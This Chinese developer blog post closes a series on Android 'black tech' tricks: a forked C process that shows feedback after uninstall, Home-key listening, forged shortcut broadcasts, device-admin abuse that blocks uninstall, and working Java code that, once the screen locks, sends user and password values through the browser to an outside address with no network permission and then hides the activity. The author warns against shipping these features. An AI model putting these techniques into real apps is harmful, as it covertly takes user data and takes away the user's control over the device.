![](http://upload-images.jianshu.io/upload_images/1110736-630b6644057d513e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


“我在发抖么？
你开什么玩笑。我只是在跳愉快的尬舞。
暗影是不会向邪恶势力低头的。 万岁~\(≧▽≦)/~！！”
                                 -- 来自暗世界android工程师


![](http://upload-images.jianshu.io/upload_images/1110736-7206b66dcfd5805e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400)


前言：

本篇是本系列的最后一个篇章。其实这些活儿也不全是在干坏事用。我们的重点不应该放在那某个技术点上。应该从中举一反三的思考。在好的一方面把学到的技术落到实处。比如往下面会讲到的往桌面添加快捷方式，你可以选择结合时下最火的插件化技术搭配添加快捷方式，实现一个无需安装app就完整的拥有启动图标和应用生命周期的附属app。用户喜欢的情况下，这不挺好的吗？毕竟也是一把双刃剑。

这个世界上手机有三大系统，苹果、 安卓、 *中国安卓*  。本篇强烈呼吁大家不要去做哪些违反用户体验的黑科技功能，研究研究玩玩就好了啦。全当增长技术，在真实的项目开发中尽量能不用就不要用得好。道理大家都懂的。

# 目录
[那些年Android黑科技①:只要活着，就有希望](http://www.jianshu.com/p/cb2deed0f2d8)
- android应用内执行shell
- 双进程保活aidl版
- 双进程保活jni版
- 保活JobService版

[那些年Android黑科技②:欺骗的艺术](http://www.jianshu.com/p/2ad105f54d07)
- hook技术
- 欺骗系统之偷梁换柱

[那些年Android黑科技③:干大事不择手段 ](http://www.jianshu.com/p/8f9b44302139)
- 应用卸载反馈
- Home键监听
- 桌面添加快捷方式
- 无法卸载app(DevicePolicManager)
- 无网络权限偷偷上传数据

---
## 应用卸载反馈

![](http://upload-images.jianshu.io/upload_images/1110736-820b7cf8d4a64758.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400)

早在国内某app上有看到一旦卸载该app就立马弹出一个网页来让我填写为什么要卸载它。从产品的角度来说，这无疑是非常好的反馈设计。但是这件事情对手机和用户来说并不好事。实现上技术上会不断的轮训手机的目录。

**原理剖析：**
我们知道当apk正常安装在手机上时会写入到/data/data/包名目录下。被卸载后系统会删除掉。

所以借助NDK开发fork出来的C语言写的的子进程代码，在应用被卸载后不会被销毁的特性。做进程内不断轮训/data/data/包名是否存在。

当apk被卸载后如果你轮训的代码是java写的。他会伴随虚拟机一起销毁。但是由于是用C来做轮训，利用了Linux子进程和java虚拟机不在一个进程中的特性就不怕被杀,这点和第一篇我们讲到的双进程守护有异曲同工之妙。但是android 5.0谷歌还是干掉了这件事，所以请君放心。哈哈

下面是C的实现部分。
```
Java_com_charon_uninstallfeedback_MainActivity_initUninstallFeedback(
		JNIEnv* env, jobject thiz, jstring packageDir, jint sdkVersion) {
	char * pd = Jstring2CStr(env, packageDir);
	//fork子进程，以执行轮询任务
	pid_t pid = fork();
	if (pid < 0) {	// fork失败了
	} else if (pid == 0) {
		// 可以一直采用一直判断文件是否存在的方式去判断，但是这样效率稍低，下面使用监听的方式，死循环，每个一秒判断一次，这样太浪费资源了。
		int check = 1;
		while (check) {
			FILE* file = fopen(pd, "rt");
			if (file == NULL) {
				if (sdkVersion >= 17) {	// Android4.2系统之后支持多用户操作，所以得指定用户
					execlp("am", "am", "start", "--user", "0", "-a",
							"android.intent.action.VIEW", "-d",
				"http://shouji.360.cn/web/uninstall/uninstall.html",
							(char*) NULL);
				} else {
					// Android4.2以前的版本无需指定用户
					execlp("am", "am", "start", "-a",
						"android.intent.action.VIEW", "-d",
				"http://shouji.360.cn/web/uninstall/uninstall.html",
							(char*) NULL);}
				check = 0;
			} else {
			}
			sleep(1);
		}
	}
}
```

java层调用部分
```
public class MainActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		String packageDir = "/data/data/" + getPackageName();
		initUninstallFeedback(packageDir, Build.VERSION.SDK_INT);
	}
	private native void initUninstallFeedback(String packagePath, int sdkVersion);
	static {
		System.loadLibrary("uninstall_feedback");
	}
}
```

细节代码请参考Github
https://github.com/CharonChui/UninstallFeedback

---

## Home键监听

一般在开发中，我们无法直接在活动中收到用户点击Home返回这样的操作回调。但多数情况下，我们开发的应用是需要感知用户离开的状态的。这里我们可以利用广播来做这件事情。

有这样一个动态广播来做监听。
````
android.intent.action.CLOSE_SYSTEM_DIALOGS
```
我们继承一个广播类，在里面可以收到用户按下Home键和长按Home(或任务键,取决于手机的设计)
![](http://upload-images.jianshu.io/upload_images/1110736-d6f98c4ac4b6eeff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)

在activity里注册一下这个广播

![](http://upload-images.jianshu.io/upload_images/1110736-d4f2a5110bf50f6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



非常简单的就实现了。下面是展示效果，可以看到日志上的结果，我们点击Home按键时收到了广播。
![](http://upload-images.jianshu.io/upload_images/1110736-55acaec3b7d05c8b.gif?imageMogr2/auto-orient/strip)


GitHub地址:https://github.com/BolexLiu/AndroidHomeKeyListen

---

## 桌面添加快捷方式

不知道大家有没有被这种流氓软件袭击过，你打开过他一次，后面就泪流满面的给你装了满满的一屏幕其他乱七八糟的一堆快捷方式。**注意可能会误认为被偷偷安装了其他App，实际上他只是一个带图标的Intent在你的桌面上，但不排除root后的机器安装app是真的，但我们今天这里只讲快捷方式。**

### 快捷方式有什么用？
- 1.可以给用户一个常用功能的快捷入口（推荐）
- 2.搭配插件化技术实现模拟安装后的app体验（推荐）
- 3.做黑产（黑色产业链的东西我不想说了，只需要记得咱们是有原则的开发者，坚决抵制做垃圾App。即使别人给钱也不做。就这么任性　（ˇ＾ˇ〉）

**原理解析：**
我们已经把AndroidManifest写烂了，一眼看过去就知道这个标签的作用。
```
  <activity android:name=".xxx">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
```
没错，我们再熟悉不过了，一般我们理解成将作为App的第一个被启动的Activity声明。实际上我们知道Android的桌面（launcher ，一般做rom层的同学接触比较多）上点击任意一个app都是通过Intent启动的。

神曾经说过，不懂的地方。*read the fucking source code*，那么我们来趴一趴launcher的源码，它是如何接收到我们要添加的快捷方式的。（别害怕，源码没有想象中那么难度，跳着看。屏蔽我们不关注的部分。）
拿到一个Android应用层的项目第一件事情干嘛？看配置文件呗。来我们瞅一眼launcher的AndroidManifest。

```
<manifest
    xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.launcher">
    <!--为了便于阅读，我省略了跟本篇无关紧要的代码 -->

       <!-- Intent received used to install shortcuts from other applications -->
        <receiver
            android:name="com.android.launcher2.InstallShortcutReceiver"
            android:permission="com.android.launcher.permission.INSTALL_SHORTCUT">
            <intent-filter>
                <action android:name="com.android.launcher.action.INSTALL_SHORTCUT" />
            </intent-filter>
        </receiver>
        <!-- Intent received used to uninstall shortcuts from other applications -->
        <receiver
            android:name="com.android.launcher2.UninstallShortcutReceiver"
            android:permission="com.android.launcher.permission.UNINSTALL_SHORTCUT">
            <intent-filter>
                <action android:name="com.android.launcher.action.UNINSTALL_SHORTCUT" />
            </intent-filter>
        </receiver>

</manifest>

```
注意我们发现了两个receiver标签，从上面的注释可以发现
<!-- Intent received used to install shortcuts from other applications -->
接收其他应用安装的快捷方式意图。这里就表明了launcher 是通过广播来添加快捷方式的。我们接着翻源码，看他是怎么处理这条广播的。根据receiver里的name标签我们找到InstallShortcutReceiver.java这个类。

首先我们发现他继承了BroadcastReceiver ，很明显就是一个广播接收者，我们直接看onReceive方法里如何处理的。
```
//代码细节部分省略太长了，不方便贴。可以自己去下载源码看。

public class InstallShortcutReceiver extends BroadcastReceiver {

//做了很多处理，比如寻找将接受到的快捷方式放在屏幕的哪个位置、重复的图标提示等
 public void onReceive(Context context, Intent data) {
      //判断这条广播的合法性
 if (!ACTION_INSTALL_SHORTCUT.equals(data.getAction())) {
            return;
        }
     ·····略

}

   //最终我们发现了这个方法，将快捷方式添加到桌面并存储到数据库
    private static boolean installShortcut(Context context, Intent data, ...参数省略) {
·····略
   if (intent.getAction() == null) {
                    intent.setAction(Intent.ACTION_VIEW);
                } else if (intent.getAction().equals(Intent.ACTION_MAIN) &&
                        intent.getCategories() != null &&
                        intent.getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
                    intent.addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                }
····略
}
····略

｝

```

重点看下面这几行，顺藤摸瓜得知这个Intent来自来自别的app或系统发过来的广播。下面黄横线的部分已经解释了，我们自己平时开发的app配置的主启动项Activitiy intent-filter在哪里被用到了。这里接收到后的intent将加到桌面并存储到数据库中。由此算是明白了系统到底是怎么做的。

![](http://upload-images.jianshu.io/upload_images/1110736-203331f3f750d74f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**实现添加快捷方式：**

好，既然已经知道原理了，我们现在就来实现一把，怎么添加一个任意的图标到桌面。

首先我们需要配置权限声明
```
    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" />
```
第二步捏造一个添加快捷方式的广播，具体请看下面的代码。注意里面有两个Intent，其中一个是广播的，一个是我们自己下次启动快捷方式时要用的，启动时可以携带Intent参数。（能做什么，知道了吧？哈哈）
```
    public static void addShortcut(Activity cx, String name) {
        // TODO: 2017/6/25  创建快捷方式的intent广播
        Intent shortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
        // TODO: 2017/6/25 添加快捷名称
        shortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);
        //  快捷图标是允许重复
        shortcut.putExtra("duplicate", false);
        // 快捷图标
        Intent.ShortcutIconResource iconRes = Intent.ShortcutIconResource.fromContext(cx, R.mipmap.ic_launcher);
        shortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, iconRes);
        // TODO: 2017/6/25 我们下次启动要用的Intent信息
        Intent carryIntent = new Intent(Intent.ACTION_MAIN);
        carryIntent.putExtra("name", name);
        carryIntent.setClassName(cx.getPackageName(),cx.getClass().getName());
        carryIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        //添加携带的Intent
        shortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, carryIntent);
        // TODO: 2017/6/25  发送广播
        cx.sendBroadcast(shortcut);
    }

```
下面们调用一下看看。这里我添加了四个快捷方式，分别是abcd、abc、ab、a，然后我们返回桌面看一眼。他们都是可以启动的。

![](http://upload-images.jianshu.io/upload_images/1110736-383fa71fd4f68f5c.gif?imageMogr2/auto-orient/strip)

github地址：https://github.com/BolexLiu/AddShortcut

---

## 无法卸载app(DevicePolicManager)
DevicePolicManager 可以做什么？
- 1.恢复出厂设置
- 2.修改屏幕解锁密码
- 3.修改屏幕密码规则长度和字符
- 4.监视屏幕解锁次数
- 5.锁屏幕
- 6.设置锁屏密码有效期
- 7.设置应用数据加密
- 8.禁止相机服务，所有app将无法使用相机

首先我想，如果你是一个Android重度体验用户，在Rom支持一键锁屏之前，你也许装过一种叫快捷锁屏、一键锁屏之类的替代实体键锁屏的应用。其中导致的问题就是当我们不需要用它的时候却发现无法被卸载。

**原理解析：**
从功能上来看，本身该项服务是用来控制设备管理，它是Android用来提供对系统进行管理的。所以一但获取到权限，不知道Android出于什么考虑,系统是不允许将其卸载掉的。我们只是在这里钻了空子。

**实现步骤：**
继承DeviceAdminReceiver类，里面的可以不要做任何逻辑处理。
```
public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
}

```
注册一下，description可以写一下你给用户看的描述。
```
   <receiver
            android:name=".MyDeviceAdminReceiver"
            android:description="@string/description"
            android:label="防卸载"
            android:permission="android.permission.BIND_DEVICE_ADMIN" >
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/deviceadmin" />

            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>
```

调用系统激活服务
```
   // 激活设备超级管理员
    public void activation() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        // 初始化要激活的组件
        ComponentName mDeviceAdminSample = new ComponentName(MainActivity.this, MyDeviceAdminReceiver.class);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活可以防止随意卸载应用");
        startActivity(intent);
    }
```
我们来看下运行的效果。激活以前是可以被卸载的。
![](http://upload-images.jianshu.io/upload_images/1110736-c4e9c0a76e313ef3.gif?imageMogr2/auto-orient/strip)

激活以后无法被卸载，连删除按钮都没有了。就算你拿其他安全工具或系统的卸载也不能卸载哦。
![](http://upload-images.jianshu.io/upload_images/1110736-f5566d61d30d8608.gif?imageMogr2/auto-orient/strip)

但是我们可以在设备管理器中可以取消激活就恢复了。这里我们是正常的方式来激活，不能排除root后的设备，当app拿到root权限后将自己提权自动激活，或者将自身写入到系统app区域，达到无法卸载的目的。所以我们常说root后的设备是不安全的也就在这里能说明问题。

github地址：https://github.com/BolexLiu/SuPerApp

---

## 无网络权限偷偷上传数据

这是一种超流氓的方式，目前市面上是存在这种app的。普通用户不太注意的话一般发现不了。另一个对立面说用户把app的访问网络权限禁用了如何告诉服务器消息呢？

**原理解析：**
虽然应用没有权限，或者我们之前有权限被用户屏蔽了。但是我们可以借鸡下蛋，调用系统浏览器带上我们要访问的参数。实际在服务端收到的时候就是一个get请求可以解析后面拼接出的参数。比如： `http://192.168.0.2/send?user=1&pwd=2` 这样就可以把user和pwd提交上去。当然这一切还不能被用户发现，所以很变态的判断用户锁屏后就打开浏览器发送消息，用户一旦解锁就回到桌面上，假装一切都没有发生过。

![](http://upload-images.jianshu.io/upload_images/1110736-2b391cb6522d0691.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


**实现代码：**
本来我不准备把代码贴出来的，但想了一下又有何妨。即便我不贴出来你也能找到，也能跟着思路写出来。但是千万千万不要给用户做这种东西。拜托了各位。
```
     Timer  timer = new Timer();
        final KeyguardManager  km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        TimerTask   task = new TimerTask() {
            @Override
            public void run() {
                // TODO: 2017/6/26  如果用户锁屏状态下，就打开网页通过get方式偷偷传输数据
                if (km.inKeyguardRestrictedInputMode()) {
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_VIEW);
                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                    intent.setData(Uri
                            .parse("http://192.168.0.2/send?user=1&pwd=2"));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }else{
                    // TODO: 2017/6/26  判断如果在桌面就什么也不做 ,如果不在桌面就返回
                    Intent intent = new Intent();
                    intent.setAction("android.intent.action.MAIN");
                    intent.addCategory("android.intent.category.HOME");
                    intent.addCategory(Intent.CATEGORY_DEFAULT);
                    intent.addCategory("android.intent.category.MONKEY");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        };
        timer.schedule(task, 1000, 2000);
```

---

## 谢幕
本系列到这里算是完结了。这个系列的技术大多数来自互联网上。我只是感兴趣做了一些自己的研究。做这些事情告诉我一个道理，论阅读源码的重要性。我也不是什么大神，只是普通的一个程序员。别再叫我大佬了。虽然我在过往的文风中老是大佬大佬的。但那只是编的故事。哈哈


我们这代人就像红橙Darren说的给了我们年轻人太多。这一路上我总是在特殊的时间点是上遇到贵人，在他们的帮助下少走不少弯路。真的很感谢这一切的发生。还有在看文章的你。真的，你们每一次点赞、喜欢、评论和关注都成为了我继续努力的动力 ，以前我只是写给自己看做一下笔记，当我发现越来越多的人在看我写的东西的时候，我想我就必须对此负责，而不是随便搞搞。


特别感谢公众号**码个蛋** ****[BaseRecyclerViewAdapterHelper](https://github.com/CymChad/BaseRecyclerViewAdapterHelper)****的作者陈宇明。最近两天交流之中感受颇多。在这里表示谢谢他的指点。老哥，稳！

---
[那些年Android黑科技①:只要活着，就有希望](http://www.jianshu.com/p/cb2deed0f2d8)
- android应用内执行shell
- 双进程保活aidl版
- 双进程保活jni版
- 保活JobService版

[那些年Android黑科技②:欺骗的艺术](http://www.jianshu.com/p/2ad105f54d07)
- hook技术
- 欺骗系统之偷梁换柱

[那些年Android黑科技③:干大事不择手段 ](http://www.jianshu.com/p/8f9b44302139)
- 应用卸载反馈
- Home键监听
- 桌面添加快捷方式
- 无法卸载app(DevicePolicManager)
- 无网络权限偷偷上传数据

---
# 如何下次找到我?
- 关注我的简书
- 本篇同步Github仓库:[https://github.com/BolexLiu/MyNote](https://github.com/BolexLiu/MyNote)  (可以关注)
![](http://upload-images.jianshu.io/upload_images/1110736-f0a700624e0723ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)